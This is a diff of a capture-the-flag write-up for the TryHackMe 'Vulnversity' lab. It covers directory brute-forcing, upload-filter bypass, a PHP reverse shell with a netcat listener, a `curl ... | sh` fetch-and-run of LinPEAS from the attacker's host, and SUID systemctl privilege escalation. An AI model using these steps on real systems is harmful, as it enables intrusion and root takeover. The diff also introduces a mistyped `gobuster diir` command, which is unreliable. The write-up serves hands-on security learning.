@@ -54,7 +54,9 @@ Machine IP: 10.10.77.241
    GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories.
    Download GoBuster [here](https://github.com/OJ/gobuster), or if you're on Kali Linux 2020.1+ run `sudo apt-get install gobuster`.
    To get started, you will need a wordlist for GoBuster (which will be used to quickly go through the wordlist to identify if there is a public directory available. If you are using Kali Linux you can find many wordlists under /usr/share/wordlists.
-   Now lets run GoBuster with a wordlist: `gobuster dir -u http://<ip>:3333 -w <word list location>`
+   Now lets run GoBuster with a wordlist: `gobuster diir -u http://<ip>:3333 -w <word list location>`
+
+   > No answer needed.
 
    Since I am using Kali Linux, I simply ran the command `gobuster dir -u http://10.10.77.241:3333 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`. The -u flag is followed by the target URL, the -w flag is followed by the path of the wordlist used. In this case, I used the directory-list-lowercase-2.3-medium.txt file from the /usr/share/wordlists/dirbuster directory.
 
@@ -70,7 +72,7 @@ Machine IP: 10.10.77.241
 
 After accessing http://10.10.77.241:3333/internal, the browser will display a page containing a file upload form.
 
-![Screenshot of upload form]()
+![Screenshot of upload form](Vulnversity/screenshots/upload_form.png?raw=true)
 
 1. Try upload a few file types to the server, what common extension seems to be blocked?
 
@@ -86,10 +88,14 @@ After accessing http://10.10.77.241:3333/internal, the browser will display a pa
 
 3. We're going to use Intruder (used for automating customised attacks).
    To begin, make a wordlist with the following extensions in:
-   ![Screenshot of word list]()
+
+   ![Screenshot of word list](Vulnversity/screenshots/wordlist.png?raw=true)
+
    Now make sure BurpSuite is configured to intercept all your browser traffic. Upload a file, once this request is captured, send it to the Intruder. Click on "Payloads" and select the "Sniper" attack type.
    Click the "Positions" tab now, find the filename and "Add §" to the extension. It should look like so:
-   ![Screenshot of burpsuite]()
+
+   ![Screenshot of burpsuite](Vulnversity/screenshots/burpsuite.png?raw=true)
+
    Run this attack, what extension is allowed?
 
    > phtml
@@ -100,16 +106,17 @@ After accessing http://10.10.77.241:3333/internal, the browser will display a pa
    To gain remote access to this machine, follow these steps:
    1. Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to http://10.10.10.10 in the browser of your TryHackMe connected device).
    2. Rename this file to php-reverse-shell.phtml
-   3. We're now going to listen to incoming connections using netcat. Run the following command: nc -lvnp 1234
+   3. We're now going to listen to incoming connections using netcat. Run the following command: `nc -lvnp 1234`
    4. Upload your shell and navigate to http://<ip>:3333/internal/uploads/php-reverse-shell.phtml - This will execute your payload
    5. You should see a connection on your netcat session
-   ![Screenshot of netcat]()
+
+   ![Screenshot of netcat](Vulnversity/screenshots/netcat.png?raw=true)
 
    > No answer needed
 
    I simply followed the steps described in this question. The reverse shell is successful.
 
-   ![Screenshot of reverse shell]()
+   ![Screenshot of reverse shell](Vulnversity/screenshots/reverse_shell.png?raw=true)
 
 5. What is the name of the user who manages the webserver?
 
@@ -117,7 +124,7 @@ After accessing http://10.10.77.241:3333/internal, the browser will display a pa
 
    Since I have access to the webserver, I simply check what users can be found in the /home directory.
 
-   ![Screenshot of ls cmd]()
+   ![Screenshot of ls cmd](Vulnversity/screenshots/ls_cmd.png?raw=true)
 
 6. What is the user flag?
 
@@ -125,24 +132,26 @@ After accessing http://10.10.77.241:3333/internal, the browser will display a pa
 
    The user flag is found in the user.txt file from the /home/bill directory.
 
-   ![Screenshot of flag]()
+   ![Screenshot of flag](Vulnversity/screenshots/flag.png?raw=true)
 
 ### Task 5: Priviledge Escalation
 
 1. In Linux, SUID (**set owner userId upon execution**) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
    For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.
-   ![Screenshot_SUID]()
+
+   ![Screenshot_SUID](Vulnversity/screenshots/suid.png?raw=true)
+
    On the system, search for all SUID files. What file stands out?
 
    > /bin/systemctl
 
    Okay, I'm gonna admit, I needed a little help for this one. So, after some research and reading, I found PEASS - Privilege Escalation Awesome Scripts SUITE, download it [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite). The script needs to be put on the vulnerable webserver, to perform the enumeration. I started a Python HTTP server on my own machine, using the `python3 -m http.server 80` command and on the webserver, I transfered the file with curl (`curl <my_tun0_ip>/linpeas.sh | sh`).
 
-   ![Screenshot_of_PEASS]()
+   ![Screenshot_of_PEASS](Vulnversity/screenshots/peass.png?raw=true)
 
    As shown in the above screenshot, the RED/YELLOW highlights are objects that can be used for PE. After waiting for PEASS to finish running, we find /bin/systemctl in the Interesting Files section.
 
-   ![Screenshot2_of_PEASS]()
+   ![Screenshot2_of_PEASS](Vulnversity/screenshots/peass1.png?raw=true)
 
 
 2. Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?
@@ -152,6 +161,6 @@ After accessing http://10.10.77.241:3333/internal, the browser will display a pa
 
    Now we need to use /bin/systemctl to become root. For this, I used [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/). Here's a screenshot of the explanation.
 
-   ![Screenshot_of_GTFOBins]()
+   ![Screenshot_of_GTFOBins](Vulnversity/screenshots/gtfobins.png?raw=true)
 
    After running the above commands, replacing id with the command we want to run as root (`cat /root/root.txt`), we start the service. The flag is written to /tmp/output.
